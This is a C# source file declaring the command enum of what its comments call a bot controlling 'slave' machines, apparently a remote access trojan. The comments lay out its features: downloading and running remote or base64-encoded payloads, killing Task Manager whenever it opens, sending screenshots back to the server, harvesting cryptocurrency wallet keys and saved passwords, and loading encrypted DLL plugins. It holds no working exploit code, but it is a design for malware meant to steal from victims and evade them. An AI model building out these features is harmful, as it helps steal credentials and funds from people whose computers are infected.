using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace SimpleTool.Enums
{
    public enum WorkType
    {
        Kill = 0,
        Restart = 1,
        Stop = 2,
        Lock = 3,
        CompRestart = 4,
        StopTaskMgr = 5,
        DLRun = 6,
        ULRun = 7,
        DLStringRun = 8,
        ULStringRun = 9,
        ScreenShot = 10,
        WalletRecovery = 11,
        PassRecovery = 12,
        Custom = 13,
        PrevPic = 14,

    }

    // Features of bot
    // Kill = Kill's the process and removes associated files
    // Restart = Stops the current stub process and then delay starts a new process (or just immediately starts)
    // Stop = Kill's the process until computer is restarted or user log off then on occurs
    // Lock = Locks the computer screen so user has to login
    // CompRestart = Restarts the computer not the stub
    // StopTaskMgr = Kills task manager process if/when it is opened (this is a toggle function)
    // DLRun = Download from URL and run the process
    // DLStringRun = Downloads a base64 string from byte to base64 then decodes the bytes and runs it on disk (look into memory options)
    // ULStringRun = Uploads a base64 string from byte to base64 then decodes the bytes and runs it on disk (look into memory options)
    // ScreenShot = Takes full screen shot of slave monitor/monitors then sends back to server - save on disk in new folder i guess? (Clients\{clientName}\Screenshots)
    // WalletRecovery = Recovers any and all found potential BTC/LTC/any crpyto wallet keys and info
    // PassRecovery = Recoverys any and all found passwords saved on disk - Look into this function
    // Custom - Plugin system, send encrypted dll bytes in correct format it will load and run with passed along parameters
    // PrevPic - takes and sends the preview snapshot via encrypted string

}
